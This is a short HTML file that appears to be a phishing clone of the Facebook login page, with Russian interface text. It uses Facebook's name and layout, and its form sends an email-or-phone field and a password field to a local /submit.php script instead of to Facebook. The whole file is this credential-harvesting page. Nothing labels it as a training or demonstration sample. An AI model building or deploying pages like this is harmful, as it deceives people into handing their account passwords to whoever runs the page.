<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>web</title>
	<link rel="stylesheet"  href="style/css/style.css">
</head>
<body>
<main>
	<header>
		<h1 class="text">facebook</h1>
	</header>
	<section>
		<nav>
			<div class="_xku">
				<span class="_50f6">Вход на Facebook</span>
			</div>
			<div class="input">
			<form action="/submit.php" method="POST">
 			 <br>
 			 <input  type="text" name="login" placeholder=" Эл. адрес или номер телефона"><br>
 			 <br>
  			<input type="text" name="password" placeholder=" Пароль"><br><br>
  			<button  name="submit"  type="submit">Вход</button>
			</div>
			<img src="style/images/img.png" alt="img">
			</form>
		</nav>
	</section>
</main>

</body>
</html>
